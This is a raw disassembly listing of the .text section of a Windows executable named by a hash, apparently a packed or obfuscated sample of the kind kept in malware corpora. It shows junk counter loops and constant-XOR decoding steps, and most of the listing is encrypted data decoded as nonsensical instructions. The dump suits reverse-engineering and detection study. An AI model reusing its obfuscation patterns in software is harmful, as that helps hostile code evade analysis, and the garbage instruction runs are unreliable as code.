
6b72ee97aa00fa451c6faa7b7f59f88f18f6fd1df460e6f8f43bb638e4562ff8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433817,0x1c
  401013:	cmp    DWORD PTR ds:0x433817,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433817,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433817,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433817
  401055:	dec    eax
  401056:	mov    ds:0x433817,eax
  40105b:	mov    eax,ds:0x433817
  401060:	dec    eax
  401061:	mov    ds:0x433817,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43381b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43381f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433853
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43382f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433813
  4010b6:	mov    DWORD PTR ds:0x43382f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4338ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43382f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43382f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43382f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43382f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43382f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43382f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43382f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43382f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4337f7
  40113c:	mov    eax,ds:0x4338b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43389b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43377f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43379f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4337db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     ch,ah
  4011b8:	lods   eax,DWORD PTR ds:[esi]
  4011b9:	cmp    al,0xb0
  4011bb:	jle    0x40123b
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [ecx+0x0],dh
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x795ab739
  40126d:	mov    ds:0x92576798,al
  401272:	add    al,0x2e
  401274:	out    0x92,eax
  401276:	mov    BYTE PTR [ecx],bh
  401278:	scas   eax,DWORD PTR es:[edi]
  401279:	jae    0x4011fc
  40127b:	pop    ecx
  40127c:	mov    ebx,0x26c46d7b
  401281:	loopne 0x401255
  401283:	retf   0x6d3b
  401286:	xchg   cl,bl
  401288:	mov    bh,0x4a
  40128a:	sub    eax,0xe3bb04b0
  40128f:	ds or  al,0x2b
  401292:	lods   eax,DWORD PTR ds:[esi]
  401293:	das    
  401294:	cmp    al,0x8c
  401296:	fs stos BYTE PTR es:[edi],al
  401298:	jnp    0x4012df
  40129a:	and    BYTE PTR [ebx+0x35e7c5b4],0xd7
  4012a1:	sbb    eax,0x8383cb8d
  4012a6:	in     eax,dx
  4012a7:	aam    0x4e
  4012a9:	aad    0xc6
  4012ab:	rcr    BYTE PTR [ebx],1
  4012ad:	and    edx,DWORD PTR [eax+edi*8]
  4012b0:	mov    dl,0x26
  4012b2:	dec    edi
  4012b3:	push   di
  4012b5:	push   ebx
  4012b6:	and    eax,0x894f9838
  4012bb:	or     BYTE PTR [edi-0x3d06b2d9],cl
  4012c1:	data16 fimul WORD PTR [esi+ecx*8+0xfa906d1]
  4012c9:	fwait
  4012ca:	pop    ebp
  4012cb:	arpl   WORD PTR [ebp+0x26cee6c1],cx
  4012d1:	sbb    BYTE PTR [esi-0x7b],cl
  4012d4:	mov    fs,WORD PTR [esi+edi*1]
  4012d7:	in     eax,0x13
  4012d9:	mov    eax,0x631e3f1
  4012de:	push   ss
  4012df:	retf   
  4012e0:	sub    esi,DWORD PTR [ebp+ebp*1+0x2e2f5051]
  4012e7:	adc    ch,BYTE PTR [edi-0x56c22a7d]
  4012ed:	cmp    esi,DWORD PTR ds:0xfe5edc27
  4012f3:	shl    BYTE PTR [edx-0x80],0x59
  4012f7:	in     al,0xf2
  4012f9:	jl     0x4012ad
  4012fb:	jmp    0x2c9d:0x2290a348
  401302:	aam    0xb5
  401304:	and    BYTE PTR [edi+0x2b5c0c6a],al
  40130a:	pop    eax
  40130b:	push   ss
  40130c:	jge    0x40134b
  40130e:	cdq    
  40130f:	jne    0x4012cc
  401311:	cmp    eax,edx
  401313:	sbb    esp,esi
  401315:	into   
  401316:	mov    bh,cl
  401318:	mov    DWORD PTR [eax+0x12572519],esp
  40131e:	adc    eax,DWORD PTR [edi]
  401320:	outs   dx,DWORD PTR ds:[esi]
  401321:	pop    ebx
  401322:	xor    eax,DWORD PTR ss:[ebx+0x3c]
  401326:	test   edx,esi
  401328:	mov    ecx,0xb96a4f85
  40132d:	adc    eax,0x787b39f7
  401332:	jge    0x40136d
  401334:	and    al,0xf7
  401336:	and    BYTE PTR [ecx],ah
  401338:	push   ds
  401339:	xor    eax,0xa6fbaf59
  40133e:	(bad)  
  401340:	rol    DWORD PTR [eax+0x5d],1
  401343:	shl    DWORD PTR [ebp+0x4589405c],0xf4
  40134a:	and    DWORD PTR ds:0x4337d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4337d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4337d3,ebx
  401366:	cmp    DWORD PTR ds:0x4337d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4337d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43378b,0x43377f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	fldenv [esi+esi*8+0x7e7ffac8]
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013e8
  4013c0:	dec    eax
  4013c1:	and    DWORD PTR [esi+0x39],esp
  4013c4:	call   0x20f8:0x557202e7
  4013cb:	(bad)  
  4013cc:	es scas eax,DWORD PTR es:[edi]
  4013ce:	cvtps2pi mm4,QWORD PTR [esi+0x3f0e7d5b]
  4013d5:	mov    al,cl
  4013d7:	pushf  
  4013d8:	(bad)  
  4013d9:	fdivr  QWORD PTR [ecx+ecx*2-0x5ea583bf]
  4013e0:	xor    esp,DWORD PTR [ebp+0x5b514f63]
  4013e6:	pop    ecx
  4013e7:	pop    ds
  4013e8:	aam    0xbd
  4013ea:	or     DWORD PTR [ebx-0x62bbf303],esp
  4013f0:	mov    cl,0xa6
  4013f2:	pop    es
  4013f3:	or     BYTE PTR [eax+0x7],dh
  4013f6:	ret    0xfc7b
  4013f9:	aaa    
  4013fa:	fisttp QWORD PTR [esi]
  4013fc:	rcr    esp,cl
  4013fe:	push   edx
  4013ff:	out    0x4c,eax
  401401:	adc    DWORD PTR [esp+esi*4],ecx
  401404:	les    eax,FWORD PTR [ebp+0x32976324]
  40140a:	sbb    DWORD PTR [ebp-0x1e],edx
  40140d:	inc    esi
  40140e:	adc    ch,BYTE PTR [ebx+0x17]
  401411:	mov    al,ds:0x3bb1a580
  401416:	cmp    edi,DWORD PTR [eax-0x5c5e536b]
  40141c:	sbb    ebx,DWORD PTR [ebx+0x7dc129d]
  401422:	scas   al,BYTE PTR es:[edi]
  401423:	adc    eax,0x94db349b
  401428:	outs   dx,DWORD PTR ds:[esi]
  401429:	out    0xf1,eax
  40142b:	jne    0x40140a
  40142d:	inc    esp
  40142e:	xchg   BYTE PTR [esi-0x61acb601],bh
  401434:	mov    ch,0xe
  401436:	pop    edx
  401437:	sub    esp,DWORD PTR [edi+0x3b]
  40143a:	mov    cs,WORD PTR [edi]
  40143c:	ret    0x526d
  40143f:	xchg   edi,eax
  401440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401441:	fcmovb st,st(3)
  401443:	ret    
  401444:	mov    ebx,DWORD PTR [esi+0x29]
  401447:	loope  0x401421
  401449:	xor    bh,BYTE PTR [esi-0x1d]
  40144c:	test   al,0xb2
  40144e:	or     bh,cl
  401450:	ins    BYTE PTR es:[edi],dx
  401451:	mov    ch,BYTE PTR [ebp-0x24f7dcf7]
  401457:	or     DWORD PTR [ebp-0x1e2246a5],edx
  40145d:	retf   
  40145e:	gs sbb eax,0x9cf7238
  401464:	call   0xaae6706
  401469:	cmp    DWORD PTR [edi],ecx
  40146b:	or     BYTE PTR [esi],bl
  40146d:	pop    ebp
  40146e:	add    esp,ebp
  401470:	push   esp
  401471:	xor    ch,al
  401473:	es das 
  401475:	mov    esi,0xbea21b3b
  40147a:	jmp    0x40148d
  40147c:	xchg   DWORD PTR [ebp-0x6],edi
  40147f:	icebp  
  401480:	pop    esp
  401481:	mov    eax,0xa3e22524
  401486:	int    0x0
  401488:	ss or  ecx,ebx
  40148b:	call   ecx
  40148d:	shr    DWORD PTR [ecx],cl
  40148f:	into   
  401490:	jno    0x401470
  401492:	cwde   
  401493:	and    BYTE PTR [esi+0x20],cl
  401496:	cmc    
  401497:	jmp    0xa8a40fa9
  40149c:	add    al,BYTE PTR [edi+ebp*1-0x3daac454]
  4014a3:	into   
  4014a4:	push   0x3d
  4014a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014a7:	sahf   
  4014a8:	out    dx,al
  4014a9:	mov    ds:0x178930ab,al
  4014ae:	mov    edx,0xee2537ee
  4014b3:	mov    cl,BYTE PTR [ebp+0x70b01f4a]
  4014b9:	sub    al,BYTE PTR [esi-0x32c673c6]
  4014bf:	mul    DWORD PTR [eax+ecx*4-0x32]
  4014c3:	add    DWORD PTR [ecx+ebp*2+0x7643035b],esp
  4014ca:	push   esp
  4014cb:	fmul   QWORD PTR [ebx]
  4014cd:	cmc    
  4014ce:	cwde   
  4014cf:	xchg   edi,eax
  4014d0:	xor    eax,0x192699f7
  4014d5:	and    BYTE PTR [ecx+0x15],bl
  4014d8:	sbb    ch,BYTE PTR [ecx-0x265c105f]
  4014de:	das    
  4014df:	mov    dl,0xc1
  4014e1:	fcom   QWORD PTR [edi+0x24eaa0e2]
  4014e7:	inc    ebx
  4014e8:	int3   
  4014e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014ea:	lahf   
  4014eb:	ficomp DWORD PTR [eax+0x2d]
  4014ee:	rcr    BYTE PTR [edx],1
  4014f0:	push   ebx
  4014f1:	adc    al,0xf3
  4014f3:	pop    ebp
  4014f4:	pop    ebx
  4014f5:	add    ecx,edi
  4014f7:	fmul   DWORD PTR [eax+ebx*2]
  4014fa:	mov    ch,0xcf
  4014fc:	fsubp  st(2),st
  4014fe:	pop    ss
  4014ff:	fistp  WORD PTR [eax-0x13]
  401502:	call   0xc2216370
  401507:	out    dx,eax
  401508:	ret    0x212a
  40150b:	adc    dh,0x9e
  40150e:	xor    bh,BYTE PTR [edi]
  401510:	mov    esi,eax
  401512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401513:	pop    ds
  401514:	push   0xffffff8d
  401516:	lods   al,BYTE PTR ds:[esi]
  401517:	scas   eax,DWORD PTR es:[edi]
  401518:	loope  0x401543
  40151a:	xchg   ecx,eax
  40151b:	test   al,0x6d
  40151d:	fisubr DWORD PTR ds:0x2d46a857
  401523:	dec    DWORD PTR [eax]
  401525:	daa    
  401526:	fsub   st,st(7)
  401528:	sub    eax,0x34b3ec00
  40152d:	icebp  
  40152e:	(bad)  
  401530:	sbb    al,0x34
  401532:	add    ebp,DWORD PTR [eax+esi*2-0x4fa0baea]
  401539:	(bad)  
  40153b:	and    bh,BYTE PTR [esi]
  40153d:	lods   eax,DWORD PTR ds:[esi]
  40153e:	ins    DWORD PTR es:[edi],dx
  40153f:	push   ecx
  401540:	retf   
  401541:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43378f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x3cfaece3]
  401564:	sub    al,0x6
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x40157f
  40156e:	aad    0xf4
  401570:	xchg   DWORD PTR [ebx-0x6d55f103],ebx
  401576:	int    0x54
  401578:	sub    dh,BYTE PTR [esi]
  40157a:	enter  0xb6,0xca
  40157e:	mov    ebx,DWORD PTR [esi-0x2ff85452]
  401584:	sbb    eax,0xafe40e34
  401589:	xchg   ebp,eax
  40158a:	(bad)  
  40158b:	fwait
  40158c:	sar    DWORD PTR [ebx+0x772d15d],1
  401592:	dec    edx
  401593:	jecxz  0x40156c
  401595:	fadd   QWORD PTR [edi+0x177a57cf]
  40159b:	sbb    eax,0x443a2adb
  4015a0:	push   ebp
  4015a1:	mov    ebx,0xd247c7ba
  4015a6:	xor    al,0x20
  4015a8:	pop    ds
  4015a9:	push   ecx
  4015aa:	pop    eax
  4015ab:	out    0xe7,eax
  4015ad:	data16 mov ds:0x2c343935,al
  4015b3:	ret    
  4015b4:	pop    ds
  4015b5:	and    esp,DWORD PTR [esi+0x3]
  4015b8:	loopne 0x4015b9
  4015ba:	pop    esp
  4015bb:	mov    dl,0x26
  4015bd:	sahf   
  4015be:	das    
  4015bf:	mov    esi,0x3b8c2553
  4015c4:	sub    DWORD PTR [ebx],ebx
  4015c6:	jecxz  0x4015f2
  4015c8:	adc    BYTE PTR [ecx+edi*4+0x385a32e7],bl
  4015cf:	ins    DWORD PTR es:[edi],dx
  4015d0:	mov    BYTE PTR [ecx+0x50],dl
  4015d3:	pop    edx
  4015d4:	loope  0x40158e
  4015d6:	mov    esp,0x4d73868c
  4015db:	in     al,0x9c
  4015dd:	ins    BYTE PTR es:[edi],dx
  4015de:	mov    dh,0x4f
  4015e0:	sbb    eax,0x264eb1fa
  4015e5:	sbb    al,BYTE PTR cs:[edi+0x28]
  4015e9:	push   ecx
  4015ea:	mov    gs,WORD PTR cs:[edx]
  4015ed:	cdq    
  4015ee:	aam    0xc8
  4015f0:	nop
  4015f1:	mov    edx,0xc92e4f87
  4015f6:	pop    ebx
  4015f7:	push   ecx
  4015f8:	xchg   edi,eax
  4015f9:	adc    BYTE PTR [esi-0x10],dl
  4015fc:	ja     0x401646
  4015fe:	dec    dh
  401600:	imul   ebp,DWORD PTR [edx],0x2e1da0e7
  401606:	clc    
  401607:	mov    al,BYTE PTR [edx]
  401609:	out    dx,eax
  40160a:	call   0x31e264f4
  40160f:	mov    edi,0x76ba3aaa
  401614:	pop    edi
  401615:	cmp    BYTE PTR [ebx-0x7135c6ee],0xd0
  40161c:	and    DWORD PTR [ecx+esi*8-0x67],eax
  401620:	dec    ebx
  401621:	cmc    
  401622:	loop   0x4015b3
  401624:	push   cs
  401625:	xchg   esi,eax
  401626:	push   0xffffffb2
  401628:	and    BYTE PTR [esi+0xa69d43e],dl
  40162e:	jae    0x401636
  401630:	jo     0x401679
  401632:	push   0xffffff8a
  401634:	mov    DWORD PTR [edx],0x1a378ac7
  40163a:	sbb    BYTE PTR cs:[edx-0x6ea44f6e],dh
  401641:	push   es
  401642:	mov    BYTE PTR [esi-0x7d],bl
  401645:	jmp    0x40166e
  401647:	jbe    0x40160c
  401649:	cmp    eax,0x369245a
  40164e:	mov    edx,0x8fffe5a3
  401653:	in     al,dx
  401654:	aaa    
  401655:	cdq    
  401656:	or     esi,DWORD PTR [edx]
  401658:	and    BYTE PTR [ebx+0x545f2de1],dh
  40165e:	in     al,0xb0
  401660:	inc    edi
  401661:	rcr    BYTE PTR [edx-0x80],cl
  401664:	cli    
  401665:	daa    
  401666:	push   es
  401667:	jg     0x40163f
  401669:	push   edx
  40166a:	stos   DWORD PTR es:[edi],eax
  40166b:	jecxz  0x401690
  40166d:	jg     0x401653
  40166f:	or     edi,ebx
  401671:	pop    ebx
  401672:	dec    ebx
  401673:	imul   ebp,DWORD PTR [eax],0x4d
  401676:	mov    eax,ds:0x99e1e3a8
  40167b:	mov    ecx,ebp
  40167d:	pop    ecx
  40167e:	cs or  eax,0x17fc51d4
  401684:	loopne 0x4016ad
  401686:	das    
  401687:	jge    0x401671
  401689:	lahf   
  40168a:	fwait
  40168b:	pop    ecx
  40168c:	mov    eax,ds:0x7ad7f4a7
  401691:	cdq    
  401692:	push   esi
  401693:	xchg   esp,eax
  401694:	pop    edx
  401695:	(bad)  
  401696:	out    dx,eax
  401697:	daa    
  401698:	pop    ebx
  40169a:	jne    0x401658
  40169c:	sub    al,0xbe
  40169e:	dec    ecx
  40169f:	xchg   edx,eax
  4016a0:	fwait
  4016a1:	dec    ebx
  4016a2:	es es dec ebx
  4016a5:	mov    BYTE PTR [esi],bh
  4016a7:	jmp    0x571953a3
  4016ac:	push   ecx
  4016ad:	or     al,0x2c
  4016af:	sub    bh,0xdc
  4016b2:	lahf   
  4016b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016b4:	xchg   BYTE PTR [edx+0x5b206d99],dl
  4016ba:	jae    0x4016fb
  4016bc:	jb     0x401706
  4016be:	jno    0x40165d
  4016c0:	jp     0x4016af
  4016c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c3:	enter  0x4190,0x5d
  4016c7:	enter  0x7bee,0x54
  4016cb:	repz mov ebp,0x27d21b35
  4016d1:	inc    BYTE PTR [edx]
  4016d3:	leave  
  4016d4:	xlat   BYTE PTR ds:[ebx]
  4016d5:	not    DWORD PTR [eax+0x38]
  4016d8:	lahf   
  4016d9:	sti    
  4016da:	mov    al,ds:0x122fbdf5
  4016df:	mov    bh,0x39
  4016e1:	xor    edx,DWORD PTR [edx-0x7]
  4016e4:	fdiv   QWORD PTR [ecx-0x39]
  4016e7:	pop    eax
  4016e8:	xchg   esi,eax
  4016e9:	xchg   ecx,eax
  4016ea:	cmp    eax,0x2843616a
  4016ef:	test   BYTE PTR [eax+0x4589c703],dh
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43385f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43385f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43385f,ebx
  401721:	cmp    DWORD PTR ds:0x43385f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43385f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43385f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43385f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43385f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433783,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433797
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43378b
  401793:	and    ecx,DWORD PTR ds:0x4337db
  401799:	mov    DWORD PTR ds:0x43378b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4338af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4338af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4338af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4338af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4338af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4338af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4338af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4338af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433863,0x0
  401819:	mov    eax,ds:0x433863
  40181e:	inc    eax
  40181f:	mov    ds:0x433863,eax
  401824:	cmp    DWORD PTR ds:0x433863,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4337a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433863,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43389f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4338ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4338ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4338ab,ecx
  401878:	cmp    DWORD PTR ds:0x4338ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4338ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4338ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4338ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4338ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x8e176ade
  4018e9:	inc    edi
  4018ea:	push   esp
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018e8
  4018f4:	mov    eax,ds:0x221838cb
  4018f9:	lahf   
  4018fa:	cwde   
  4018fb:	cmp    edi,ebp
  4018fd:	mov    bh,BYTE PTR [eax+ebp*2-0x65]
  401901:	sbb    DWORD PTR [ebx],0x78
  401904:	or     ebx,0xaf68d52a
  40190a:	es mov edx,ss
  40190d:	mov    ds:0xabcd2d59,eax
  401912:	adc    ebp,ecx
  401914:	pop    ebp
  401915:	mov    ebx,0x72895e3a
  40191a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40191b:	jle    0x4018e6
  40191d:	cli    
  40191e:	jo     0x4018de
  401920:	sti    
  401921:	mov    ebx,0xb9136412
  401926:	and    al,0x5c
  401928:	dec    ebp
  401929:	daa    
  40192a:	push   ss
  40192b:	std    
  40192c:	je     0x40190a
  40192e:	push   ecx
  40192f:	and    BYTE PTR [edi+0x5a6f9ef5],al
  401935:	cmp    ebp,edi
  401937:	scas   al,BYTE PTR es:[edi]
  401938:	repnz push es
  40193a:	mov    bh,0xd5
  40193c:	lock add al,0xf6
  40193f:	add    DWORD PTR [edx+eax*1-0x1e],esi
  401943:	and    al,0xe9
  401945:	(bad)  
  401946:	pop    ss
  401947:	or     BYTE PTR ds:0x71b6590d,ah
  40194d:	jmp    0x31e:0x7a3156c8
  401954:	cli    
  401955:	push   esi
  401956:	dec    ebp
  401957:	sbb    dh,cl
  401959:	fist   WORD PTR ds:0x2b2c266a
  40195f:	aaa    
  401960:	pop    ebp
  401961:	jge    0x4019a6
  401963:	mov    ds:0x1181939a,al
  401968:	fist   WORD PTR [eax-0x5f]
  40196b:	sbb    ecx,esi
  40196d:	mov    esi,DWORD PTR [esi+0xc]
  401970:	and    DWORD PTR [ecx+0x4169d1c3],edi
  401976:	test   al,0xde
  401978:	stc    
  401979:	call   0xb2cb00b9
  40197e:	xchg   ecx,eax
  40197f:	outs   dx,DWORD PTR ds:[esi]
  401980:	mov    ds:0xbca2cefc,eax
  401985:	out    0x83,al
  401987:	push   es
  401988:	(bad)  
  401989:	xor    eax,0x5ad7537e
  40198e:	xchg   esi,eax
  40198f:	cmp    edx,edi
